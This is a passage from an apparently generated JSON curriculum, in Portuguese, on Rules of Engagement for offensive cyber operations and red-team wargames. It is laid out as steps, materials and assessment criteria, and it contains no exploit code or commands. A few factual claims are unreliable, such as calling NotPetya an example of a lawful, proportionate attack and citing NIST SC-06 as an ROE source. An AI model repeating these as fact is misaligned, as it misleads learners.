                            "name": "Identificar a definição padrão de ROE em operações cibernéticas",
                            "description": "Reconhecer que as ROE são instruções específicas que delimitam ações permitidas em ataques cibernéticos, diferenciando-as de regras de confronto (Rules of Combat) e adaptando-as ao mindset do adversário em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de ROE em contextos militares tradicionais",
                                  "subSteps": [
                                    "Leia definições padrão de ROE de fontes militares como manuais do Departamento de Defesa dos EUA.",
                                    "Identifique componentes chave: delimitação de ações permitidas, condições de engajamento e autoridade.",
                                    "Analise exemplos históricos, como ROE na Guerra do Golfo.",
                                    "Anote as diferenças entre ROE e Leis de Conflito Armado (LOAC).",
                                    "Resuma em suas próprias palavras o propósito principal das ROE tradicionais."
                                  ],
                                  "verification": "Recite verbalmente ou por escrito a definição básica de ROE tradicional e forneça um exemplo histórico.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Manuais militares online (ex: Joint Publication 3-0), artigos da Wikipedia sobre ROE",
                                    "Bloco de notas e caneta"
                                  ],
                                  "tips": "Use analogias cotidianas, como semáforos regulando tráfego, para visualizar delimitações.",
                                  "learningObjective": "Dominar a definição e propósito fundamental de ROE em operações militares convencionais.",
                                  "commonMistakes": [
                                    "Confundir ROE com LOAC (ROE são operacionais, LOAC são legais)",
                                    "Ignorar o aspecto dinâmico e adaptável das ROE"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar ROE de Rules of Combat em operações cibernéticas",
                                  "subSteps": [
                                    "Pesquise definições de Rules of Combat (ROC) versus ROE em cibernética.",
                                    "Liste atributos únicos das ROE cibernéticas: foco em ações digitais como exploits e persistência.",
                                    "Compare tabelas: ROE cibernéticas vs. tradicionais (ex: ROE cibernéticas incluem thresholds de impacto).",
                                    "Estude casos onde ROE cibernéticas evitam escalada física.",
                                    "Crie um fluxograma ilustrando quando aplicar ROE vs. ROC."
                                  ],
                                  "verification": "Crie uma tabela comparativa de 5 diferenças chave entre ROE e Rules of Combat em cibernética.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentos da NSA ou CYBERCOM sobre ROE cibernéticas",
                                    "Ferramenta de diagramação como Draw.io"
                                  ],
                                  "tips": "Pense em ROE como 'regras de jogo' específicas para ciberespaço, não combate físico.",
                                  "learningObjective": "Distinguir precisamente ROE cibernéticas de conceitos relacionados como Rules of Combat.",
                                  "commonMistakes": [
                                    "Assumir que ROE cibernéticas são idênticas às tradicionais",
                                    "Subestimar a fluidez devido à natureza anônima do ciberespaço"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e memorizar a definição padrão de ROE em operações cibernéticas",
                                  "subSteps": [
                                    "Localize a definição padrão: 'Instruções específicas que delimitam ações permitidas em ataques cibernéticos'.",
                                    "Memorize elementos chave: delimitação de ações, adaptação a cenários cibernéticos, autoridade de aprovação.",
                                    "Repita a definição 5 vezes em voz alta, variando contextos.",
                                    "Escreva a definição de memória e compare com fontes originais.",
                                    "Teste-se com flashcards: 'O que ROE cibernéticas delimitam?'."
                                  ],
                                  "verification": "Escreva a definição exata de ROE cibernéticas sem consultar materiais e explique 3 componentes chave.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Flashcards digitais (Anki app)",
                                    "Fontes oficiais como Tallinn Manual 2.0 on Cyber Operations"
                                  ],
                                  "tips": "Use mnemônicos: ROE = 'Regras Ofensivas Específicas' para ações cibernéticas.",
                                  "learningObjective": "Internalizar a definição padrão de ROE específica para operações cibernéticas.",
                                  "commonMistakes": [
                                    "Generalizar definições tradicionais sem adaptações cibernéticas",
                                    "Omitir o foco em 'ações permitidas'"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adaptar ROE ao mindset do adversário em jogos de guerra cibernética",
                                  "subSteps": [
                                    "Analise mindset adversário: anonimato, assimetria, escalada rápida.",
                                    "Adapte ROE: inclua critérios como attribution confidence e impacto colateral digital.",
                                    "Simule um wargame: defina ROE hipotéticas considerando psicologia inimiga.",
                                    "Avalie como ROE mudam com inteligência sobre adversário.",
                                    "Documente 3 adaptações ROE baseadas em cenários de wargame."
                                  ],
                                  "verification": "Desenvolva um conjunto de ROE adaptadas para um wargame cibernético específico e justifique com mindset adversário.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas de simulação cibernética (ex: Cyber Range demos)",
                                    "Relatórios de wargames como Locked Shields"
                                  ],
                                  "tips": "Modele o adversário como um 'jogador de xadrez invisível' para enfatizar adaptação.",
                                  "learningObjective": "Aplicar definição de ROE considerando dinâmicas psicológicas e estratégicas em wargames cibernéticos.",
                                  "commonMistakes": [
                                    "Ignorar anonimato cibernético nas ROE",
                                    "Não adaptar ROE para respostas assimétricas do adversário"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um wargame cibernético simulando um ataque a infraestruturas críticas russas, as ROE especificam: 'Permitido injetar malware apenas se attribution >90% e sem impacto em civis; proibir DDoS se risco de escalada física'. Isso diferencia de Rules of Combat, focando em thresholds digitais.",
                              "finalVerifications": [
                                "Recite a definição padrão de ROE cibernéticas verbatim.",
                                "Liste 4 diferenças entre ROE cibernéticas e tradicionais.",
                                "Explique como adaptar ROE ao mindset adversário em um wargame.",
                                "Crie uma ROE hipotética para um cenário de persistência cibernética.",
                                "Diferencie ROE de Rules of Combat com exemplos.",
                                "Identifique 3 componentes chave de ROE em operações ofensivas cibernéticas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na recitação da definição padrão (100% match).",
                                "Correta diferenciação de ROE vs. Rules of Combat (mínimo 4 pontos válidos).",
                                "Profundidade na adaptação a mindset adversário (inclui anonimato e assimetria).",
                                "Criatividade e realismo em exemplos de ROE hipotéticas.",
                                "Compreensão de propósitos: delimitação e prevenção de escalada.",
                                "Uso correto de terminologia cibernética específica."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional: Tallinn Manual e normas cibernéticas.",
                                "Estratégia Militar: Teoria de jogos e wargaming.",
                                "Psicologia: Análise de mindset adversário e decision-making sob incerteza.",
                                "Inteligência: Attribution e OSINT em cibernética.",
                                "Simulações: Modelagem computacional de cenários ROE."
                              ],
                              "realWorldApplication": "Em operações cibernéticas reais, como as do USCYBERCOM contra ISIS ou na Ucrânia, ROE padrão delimitam ações para autorizações presidenciais, previnem guerra total e adaptam a respostas inimigas, garantindo legalidade e proporcionalidade em ataques como NotPetya."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.2",
                            "name": "Explicar o propósito das ROE em operações ofensivas",
                            "description": "Descrever como as ROE minimizam riscos de escalada não intencional, protegem ativos críticos e asseguram conformidade legal em cenários de ethical hacking e pivoting, com base em práticas de Red Team descritas em literatura como VEST e TUBBERVILLE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a Definição Geral de Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Pesquise a definição padrão de ROE em contextos militares e cibernéticos.",
                                    "Identifique componentes chave: limites de ação, autorização e restrições.",
                                    "Compare ROE com Rules of Engagement em operações tradicionais vs. cibernéticas.",
                                    "Anote exemplos históricos de ROE em conflitos armados.",
                                    "Registre como ROE evoluíram para o domínio cibernético."
                                  ],
                                  "verification": "Crie um resumo de 1 parágrafo definindo ROE e seus componentes principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentos militares como FM 6-0 (US Army), sites como NATO glossary",
                                    "Artigos sobre ROE cibernéticas (ex: Tallinn Manual)"
                                  ],
                                  "tips": "Use analogias militares para facilitar a compreensão inicial.",
                                  "learningObjective": "Compreender o conceito fundamental de ROE e sua adaptação ao ciberespaço.",
                                  "commonMistakes": [
                                    "Confundir ROE com leis internacionais; ROE são diretrizes operacionais específicas da missão."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Contexto de ROE em Operações Ofensivas Cibernéticas",
                                  "subSteps": [
                                    "Estude o papel de ROE em Red Team operations e ethical hacking.",
                                    "Analise cenários de pivoting e como ROE controlam movimentos laterais.",
                                    "Revise práticas de Red Team em literatura especializada.",
                                    "Identifique diferenças entre operações ofensivas autorizadas e não autorizadas.",
                                    "Mapeie ROE em fases de um cyber attack: reconnaissance, exploitation, pivoting."
                                  ],
                                  "verification": "Desenhe um fluxograma simples mostrando ROE aplicadas em uma operação ofensiva.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Livros/guias de Red Team como 'Red Team Field Manual'",
                                    "Documentos VEST e TUBBERVILLE sobre ROE cibernéticas"
                                  ],
                                  "tips": "Foque em pivoting: ROE definem quando parar para evitar detecção desnecessária.",
                                  "learningObjective": "Aplicar ROE ao contexto específico de operações cibernéticas ofensivas.",
                                  "commonMistakes": [
                                    "Ignorar o escopo limitado de ethical hacking; ROE não substituem consentimento legal."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar os Propósitos Principais das ROE",
                                  "subSteps": [
                                    "Descreva como ROE minimizam riscos de escalada não intencional.",
                                    "Explique a proteção de ativos críticos (próprios e de terceiros).",
                                    "Discuta a garantia de conformidade legal e ética.",
                                    "Examine casos onde violação de ROE levou a falhas operacionais.",
                                    "Sintetize os três propósitos em uma tabela comparativa."
                                  ],
                                  "verification": "Escreva 3 parágrafos, um para cada propósito principal, com exemplos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Referências VEST para minimização de riscos",
                                    "TUBBERVILLE para conformidade legal",
                                    "Casos de estudo de cyber exercises como Cyber Flag"
                                  ],
                                  "tips": "Lembre-se: ROE são dinâmicas e ajustadas por commanders durante a operação.",
                                  "learningObjective": "Dominar os propósitos de ROE: risco, proteção e legalidade em ethical hacking.",
                                  "commonMistakes": [
                                    "Superestimar ROE como 'regras fixas'; elas são adaptáveis ao cenário."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar ROE com Práticas de Red Team e Literatura Específica",
                                  "subSteps": [
                                    "Leia trechos chave de VEST sobre ROE em pivoting.",
                                    "Analise TUBBERVILLE para ROE em operações ofensivas.",
                                    "Crie cenários hipotéticos aplicando essas práticas.",
                                    "Compare com standards como MITRE ATT&CK para ROE alignment.",
                                    "Prepare um relatório final resumindo aprendizados."
                                  ],
                                  "verification": "Produza um case study de 300 palavras usando VEST/TUBBERVILLE.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Documentos VEST e TUBBERVILLE (PDFs ou resumos)",
                                    "MITRE ATT&CK framework online"
                                  ],
                                  "tips": "Busque PDFs acadêmicos ou relatórios DoD para VEST/TUBBERVILLE.",
                                  "learningObjective": "Conectar teoria de ROE com práticas reais de Red Team.",
                                  "commonMistakes": [
                                    "Não citar fontes; sempre valide com literatura primária."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um Red Team exercise simulando pivoting em uma rede corporativa, as ROE especificam: 'Explorar apenas hosts autorizados, parar pivoting se risco de escalada > 20%, notificar chain of command antes de exfiltração'. Isso previne acesso acidental a sistemas críticos, evitando denúncias legais e mantendo o exercício ético.",
                              "finalVerifications": [
                                "Explique verbalmente os 3 propósitos principais das ROE em 2 minutos.",
                                "Identifique 2 riscos de não seguir ROE em um cenário de pivoting.",
                                "Cite exemplos de VEST e TUBBERVILLE aplicados a ethical hacking.",
                                "Crie uma ROE simples para um mock cyber operation.",
                                "Diferencie ROE de legal compliance em uma quiz de 5 perguntas.",
                                "Descreva como ROE protegem ativos em um diagrama."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e propósitos de ROE (80% cobertura).",
                                "Uso correto de referências VEST/TUBBERVILLE (citações específicas).",
                                "Compreensão de riscos em ethical hacking/pivoting.",
                                "Capacidade de aplicar ROE em cenários práticos.",
                                "Clareza na distinção entre escalada intencional e não intencional.",
                                "Integração de conformidade legal/ética."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional: Ligação com Convenções de Genebra e Tallinn Manual.",
                                "Ética Profissional: Alinhamento com códigos de conduta em cibersegurança (ISC2).",
                                "Gestão de Riscos: Integração com frameworks como NIST RMF.",
                                "Liderança e Tomada de Decisão: ROE em command & control (C2)."
                              ],
                              "realWorldApplication": "Em pentests contratados (ex: empresas Fortune 500), ROE definem escopo para evitar violações como acessar dados sensíveis de clientes, prevenindo lawsuits e garantindo que o pivoting permaneça dentro do contrato, similar a operações Red Team em exercícios governamentais como Locked Shields."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.1.3",
                            "name": "Diferenciar ROE de outros regulamentos operacionais",
                            "description": "Comparar ROE com conceitos como Consciência Situacional e Indicadores de Compromisso, destacando seu papel único em definir condições de engajamento durante planejamento de cenários de ameaça cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir e compreender Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Pesquisar definições oficiais de ROE em doutrinas militares e cibernéticas (ex: JP 3-0, NIST Cybersecurity Framework)",
                                    "Identificar componentes chave: condições de uso de força, limites geográficos/temporais e requisitos de aprovação",
                                    "Analisar o propósito: estabelecer diretrizes legais e éticas para engajamento em operações ofensivas",
                                    "Estudar exemplos de ROE em contextos cibernéticos, como autorização para contra-ataques",
                                    "Mapear o ciclo de vida das ROE: criação, aprovação e revisão"
                                  ],
                                  "verification": "Escrever um resumo de 100 palavras definindo ROE e seus componentes principais",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Doutrina JP 3-0 Joint Operations",
                                    "NIST SP 800-53 SC-06",
                                    "Glossário de termos cibernéticos militares"
                                  ],
                                  "tips": "Use fontes primárias oficiais para evitar interpretações genéricas",
                                  "learningObjective": "Dominar a definição precisa e os elementos constitutivos das ROE em operações cibernéticas",
                                  "commonMistakes": [
                                    "Confundir ROE com políticas gerais de TI",
                                    "Ignorar o aspecto legal e de accountability"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e descrever outros regulamentos operacionais",
                                  "subSteps": [
                                    "Definir Consciência Situacional (SA): coleta e análise contínua de dados ambientais em cenários cibernéticos",
                                    "Explicar Indicadores de Compromisso (IOCs): sinais específicos de ameaça, como hashes maliciosos ou padrões de tráfego",
                                    "Listar outros regulamentos: Standing Rules of Engagement (SROE), Rules for the Use of Force (RUF) e ordens de missão",
                                    "Comparar superficialmente: SA é observacional, IOCs são detectivos, enquanto ROE é prescritivo",
                                    "Coletar exemplos reais de SA e IOCs em incidentes cibernéticos (ex: SolarWinds)"
                                  ],
                                  "verification": "Criar uma tabela comparativa inicial com definições de SA, IOCs e outros regulamentos",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "MITRE ATT&CK Framework",
                                    "Relatórios de incidentes cibernéticos (ex: Mandiant M-Trends)",
                                    "Documentos SROE"
                                  ],
                                  "tips": "Diferencie 'descrição' de 'aplicação prática' para cada conceito",
                                  "learningObjective": "Reconhecer as funções distintas de SA, IOCs e regulamentos relacionados às ROE",
                                  "commonMistakes": [
                                    "Equiparar SA a ROE por ambos envolverem 'situação'",
                                    "Subestimar IOCs como meros alertas técnicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar ROE com outros regulamentos operacionais",
                                  "subSteps": [
                                    "Criar matriz de comparação: escopo (ROE: engajamento; SA: monitoramento), legalidade e flexibilidade",
                                    "Destacar diferenças chave: ROE define 'quando agir', SA informa 'o que está acontecendo', IOCs sinalizam 'ameaças específicas'",
                                    "Analisar interdependências: SA e IOCs alimentam decisões sob ROE",
                                    "Identificar sobreposições e gaps: ROE não substitui SA, mas a complementa em cenários de ameaça",
                                    "Discutir exemplos de confusão em wargames cibernéticos"
                                  ],
                                  "verification": "Preencher uma tabela de comparação com pelo menos 5 diferenças e 3 semelhanças",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Templates de matriz comparativa (Excel/Google Sheets)",
                                    "Casos de estudo de operações cibernéticas (ex: Stuxnet)"
                                  ],
                                  "tips": "Use linguagem tabular para clareza visual nas diferenças",
                                  "learningObjective": "Diferenciar precisamente ROE de SA, IOCs e outros regulamentos em termos de função e aplicação",
                                  "commonMistakes": [
                                    "Generalizar todas como 'regras operacionais'",
                                    "Ignorar contexto dinâmico de ameaças cibernéticas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar diferenciação no planejamento de cenários de ameaça cibernética",
                                  "subSteps": [
                                    "Simular um cenário: ataque DDoS estatal; definir ROE para contra-engajamento",
                                    "Integrar SA e IOCs: usar SA para monitorar, IOCs para confirmar, ROE para autorizar resposta",
                                    "Avaliar riscos de confusão: sem ROE clara, SA pode levar a ações prematuras",
                                    "Revisar iterações: ajustar ROE baseado em feedback de SA em planejamento",
                                    "Documentar lições aprendidas para wargames futuros"
                                  ],
                                  "verification": "Desenvolver um plano de cenário com ROE destacada vs. outros elementos",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramentas de simulação cibernética (ex: Cyber Range virtual)",
                                    "Templates de planejamento de missões"
                                  ],
                                  "tips": "Sempre ancorar na cadeia de comando para ROE",
                                  "learningObjective": "Aplicar diferenciação de ROE em planejamento prático de ameaças cibernéticas",
                                  "commonMistakes": [
                                    "Tratar ROE como reativa em vez de proativa no planejamento",
                                    "Subordinar ROE a SA"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um wargame cibernético simulando um ataque russo a infraestruturas críticas dos EUA, SA detecta tráfego anômalo (via IOCs como IPs conhecidos), mas ROE especifica que contra-ataque só é autorizado após confirmação de atribuição estatal e aprovação do comando, evitando escalada acidental.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças chave entre ROE e SA",
                                "Identificar corretamente o papel único de ROE em um cenário dado",
                                "Diferenciar IOCs de ROE em uma tabela",
                                "Aplicar ROE corretamente em um mini-caso de estudo",
                                "Listar 2 riscos de confundir ROE com outros regulamentos",
                                "Revisar um plano de engajamento destacando ROE"
                              ],
                              "assessmentCriteria": [
                                "Precisão nas definições e comparações (90% acurácia)",
                                "Uso de exemplos concretos e contextuais cibernéticos",
                                "Profundidade na matriz de diferenças (mínimo 5 itens únicos)",
                                "Clareza na aplicação a cenários de planejamento",
                                "Identificação correta de interdependências sem confusões",
                                "Documentação completa com verificações por step"
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional Humanitário (limites éticos de engajamento)",
                                "Estratégia Militar e Teoria de Jogos (decisões sob incerteza)",
                                "Inteligência e Análise de Dados (integração com SA)",
                                "Ética em Cibersegurança (accountability em ações ofensivas)"
                              ],
                              "realWorldApplication": "Durante a resposta ao ciberataque NotPetya em 2017, ROE claras diferenciadas de SA permitiram aos defensores monitorar (SA/IOCs) sem engajar ofensivamente sem autorização, prevenindo escalada global e alinhando com tratados internacionais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.2",
                        "name": "Componentes Estruturais das ROE",
                        "description": "Elementos chave que compõem as ROE, incluindo diretivas positivas (ações permitidas), negativas (ações proibidas) e condições específicas para ativação em ambientes de operações cibernéticas ofensivas.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.2.1",
                            "name": "Listar e descrever componentes positivos e negativos das ROE",
                            "description": "Analisar diretivas que autorizam ações como persistência e pivoting em redes, versus proibições de danos colaterais, utilizando exemplos de montagem de ambientes de jogos cibernéticos para Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito e Estrutura Geral das ROE",
                                  "subSteps": [
                                    "Defina ROE como regras que delimitam ações permitidas em operações cibernéticas ofensivas.",
                                    "Identifique componentes estruturais típicos: introdução, definições, autorizações positivas, proibições negativas e verificações.",
                                    "Estude exemplos históricos de ROE em exercícios militares cibernéticos.",
                                    "Analise o propósito das ROE: minimizar escalada, proteger aliados e cumprir leis internacionais.",
                                    "Crie um mapa mental da hierarquia das ROE em cenários de Red Team."
                                  ],
                                  "verification": "Crie um resumo de 1 página listando 5 componentes gerais das ROE com definições breves.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentos ROE fictícios para simulação",
                                    "Vídeos introdutórios sobre ROE em ciberoperações (YouTube ou plataformas educacionais)",
                                    "Ferramenta de mind mapping como MindMeister"
                                  ],
                                  "tips": "Comece com ROE reais de exercícios públicos como Cyber Flag para contextualizar.",
                                  "learningObjective": "Entender a estrutura fundamental das ROE para diferenciar componentes positivos e negativos.",
                                  "commonMistakes": [
                                    "Confundir ROE com SOPs (Procedimentos Operacionais Padrão)",
                                    "Ignorar contexto legal internacional como Convenção de Genebra"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Descrever Componentes Positivos das ROE",
                                  "subSteps": [
                                    "Liste autorizações explícitas: persistência em redes adversárias e pivoting para hosts laterais.",
                                    "Descreva condições para ações positivas, como reconnaissance ativa sem disrupção.",
                                    "Exemplo: Em um jogo cibernético, permita escalada de privilégios se não houver dados civis.",
                                    "Analise impactos: acelera objetivos da missão sem violar limites éticos.",
                                    "Documente 3-5 componentes positivos com frases diretas das ROE simuladas.",
                                    "Compare com cenários reais de Red Team em ambientes controlados."
                                  ],
                                  "verification": "Elabore uma tabela com 4 componentes positivos, suas descrições e exemplos de aplicação.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Templates de ROE positivas de fontes como NIST ou MITRE ATT&CK",
                                    "Ambiente virtual como Cyber Range para simular persistência",
                                    "Ferramentas como Excel ou Google Sheets para tabelas"
                                  ],
                                  "tips": "Use linguagem condicional (e.g., 'permitido se...') para precisão nas descrições.",
                                  "learningObjective": "Dominar componentes que habilitam ações ofensivas seguras e legais.",
                                  "commonMistakes": [
                                    "Sobrestimar escopo: persistência não inclui exfiltração de dados sensíveis",
                                    "Não contextualizar com pivoting em redes segmentadas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Descrever Componentes Negativos das ROE",
                                  "subSteps": [
                                    "Liste proibições: danos colaterais a infraestruturas civis ou sistemas críticos.",
                                    "Descreva restrições como 'não disruptir serviços essenciais' ou 'evitar alvos não autorizados'.",
                                    "Exemplo: Proibido DDoS em servidores que suportam hospitais durante simulações.",
                                    "Analise consequências de violações: escalada geopolítica ou sanções legais.",
                                    "Crie uma lista de 4-6 componentes negativos com justificativas éticas e operacionais."
                                  ],
                                  "verification": "Produza um fluxograma mostrando quando uma ação viola ROE negativas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Casos de estudo de incidentes cibernéticos (e.g., Stuxnet análise)",
                                    "Ferramenta de fluxograma como Lucidchart",
                                    "ROE negativas de manuais militares desclassificados"
                                  ],
                                  "tips": "Foque em 'linhas vermelhas' claras para evitar ambiguidades em campo.",
                                  "learningObjective": "Reconhecer limites que protegem contra riscos desnecessários.",
                                  "commonMistakes": [
                                    "Interpretar proibições como absolutas sem exceções de escalada aprovada",
                                    "Ignorar danos colaterais indiretos como lentidão em redes compartilhadas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e Aplicar em Cenários de Jogos Cibernéticos para Red Team",
                                  "subSteps": [
                                    "Monte um ambiente simulado: VM com rede vulnerável representando alvo.",
                                    "Aplique ROE: execute persistência positiva mas evite pivoting para zona proibida.",
                                    "Registre violações potenciais e correções baseadas em componentes negativos.",
                                    "Discuta em grupo ou autoavaliação: equilíbrio entre positivos e negativos.",
                                    "Gere relatório final integrando todos componentes em um cenário coeso."
                                  ],
                                  "verification": "Simule uma operação Red Team curta (15 min) e valide aderência às ROE listadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas como VirtualBox, Metasploit para simulação",
                                    "Scripts de ROE para automação de verificações",
                                    "Ambiente Cyber Range gratuito como TryHackMe"
                                  ],
                                  "tips": "Grave a sessão para revisão posterior e análise de decisões.",
                                  "learningObjective": "Integrar conhecimento em prática simulada para consciência situacional.",
                                  "commonMistakes": [
                                    "Executar ações sem pausar para checar ROE em tempo real",
                                    "Confundir simulação com produção real sem isolamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético Red Team, configure uma rede com DMZ (permitida persistência) e core crítico (proibido pivoting). Use componentes positivos para manter foothold na DMZ via webshell, mas pare ao detectar rota para core, evitando danos colaterais simulados como blackout de serviços essenciais.",
                              "finalVerifications": [
                                "Lista precisa de pelo menos 4 componentes positivos com descrições acionáveis.",
                                "Lista completa de 4-6 componentes negativos com exemplos de violações.",
                                "Análise equilibrada mostrando trade-offs entre positivos e negativos.",
                                "Aplicação correta em cenário simulado sem violações.",
                                "Relatório final com mapa mental ou tabela integrando todos elementos.",
                                "Autoavaliação de aderência às ROE em 90%+ das ações simuladas."
                              ],
                              "assessmentCriteria": [
                                "Precisão factual: 100% dos componentes listados corretos conforme referências padrão.",
                                "Profundidade descritiva: Cada componente com pelo menos 2 exemplos concretos.",
                                "Relevância contextual: Todas descrições ligadas a operações Red Team.",
                                "Criatividade na aplicação: Cenário prático inovador e realista.",
                                "Completude estrutural: Todos campos de steps preenchidos adequadamente.",
                                "Clareza e organização: Linguagem concisa, sem ambiguidades."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Análise de conformidade com leis cibernéticas internacionais.",
                                "Estratégia Militar: Paralelos com ROE em operações cinéticas tradicionais.",
                                "Gestão de Riscos: Identificação de ameaças colaterais em ciberoperações.",
                                "Simulação e Modelagem: Uso de ferramentas de cyber range para treinamento."
                              ],
                              "realWorldApplication": "Em operações ofensivas reais de Red Team para agências governamentais, como pentests autorizados, as ROE garantem que persistência e pivoting sejam usados para mapear vulnerabilidades sem causar interrupções em serviços públicos, evitando litígios e escaladas diplomáticas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.2",
                            "name": "Interpretar condições de ativação e escalonamento nas ROE",
                            "description": "Examinar triggers como níveis de ameaça ou comandos de controle cibernético que ativam fases de engajamento, integrando ferramentas de ethical hacking conforme SIMPSON et al.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral das ROE em Operações Cibernéticas",
                                  "subSteps": [
                                    "Ler e resumir a definição de ROE conforme SIMPSON et al., focando em contextos ofensivos cibernéticos.",
                                    "Identificar componentes estruturais principais: ativação, escalonamento, limites e desengajamento.",
                                    "Mapear diferenças entre ROE físicas e cibernéticas, como triggers baseados em dados de rede.",
                                    "Criar um diagrama simples da hierarquia das ROE em um documento de operações.",
                                    "Revisar exemplos históricos de ROE em wargames cibernéticos."
                                  ],
                                  "verification": "Produzir um resumo de 1 página listando 5 componentes chave das ROE com exemplos cibernéticos.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Artigo de SIMPSON et al.",
                                    "Templates de diagrama (Draw.io ou papel), Notas de aula sobre SC-06"
                                  ],
                                  "tips": "Use analogias militares tradicionais para contextualizar ROE cibernéticas, mas destaque a velocidade e intangibilidade cibernética.",
                                  "learningObjective": "Dominar os fundamentos estruturais das ROE para interpretação precisa de condições.",
                                  "commonMistakes": [
                                    "Confundir ROE com Rules of Armed Conflict (ROAC); ignorar especificidades cibernéticas como latência de rede."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Interpretar Condições de Ativação (Triggers)",
                                  "subSteps": [
                                    "Listar tipos de triggers: níveis de ameaça (baixo/médio/alto), detecções de IOCs (Indicators of Compromise).",
                                    "Analisar triggers baseados em comandos de controle cibernético (C2), como beacons maliciosos.",
                                    "Classificar triggers por fonte: inteligência humana (HUMINT), SIGINT ou ferramentas automatizadas.",
                                    "Simular um trigger em um ambiente virtual: configure um alerta de threshold de tráfego anômalo.",
                                    "Documentar 3 exemplos de triggers de SIMPSON et al. com thresholds quantitativos."
                                  ],
                                  "verification": "Criar uma tabela com 5 triggers, suas descrições e exemplos de ativação em cenários cibernéticos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de monitoramento como Wireshark, Base de dados MITRE ATT&CK, Artigo SIMPSON et al."
                                  ],
                                  "tips": "Priorize triggers mensuráveis (e.g., pacotes por segundo) para evitar ambiguidades em operações reais.",
                                  "learningObjective": "Reconhecer e classificar triggers que iniciam fases de engajamento cibernético.",
                                  "commonMistakes": [
                                    "Subestimar falsos positivos em triggers automatizados; não considerar cadeia de comando para validação."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Mecanismos de Escalonamento nas ROE",
                                  "subSteps": [
                                    "Definir escalonamento: progressão de respostas (e.g., reconnaissance → disruption → destruction).",
                                    "Mapear critérios de escalonamento: intensidade da ameaça, autorização de escalão superior.",
                                    "Estudar integrações com ethical hacking: usar scans Nmap para validar escalonamento.",
                                    "Construir um fluxograma de escalonamento para um cenário de ataque persistente avançado (APT).",
                                    "Avaliar riscos de escalonamento excessivo, como blowback cibernético."
                                  ],
                                  "verification": "Desenvolver um fluxograma funcional mostrando 3 níveis de escalonamento com triggers associados.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ferramentas ethical hacking: Nmap, Nessus trial; MITRE ATT&CK Navigator, Ferramenta de fluxograma (Lucidchart)"
                                  ],
                                  "tips": "Sempre inclua pontos de 'hold' ou 'de-escalate' para manter proporcionalidade nas ROE.",
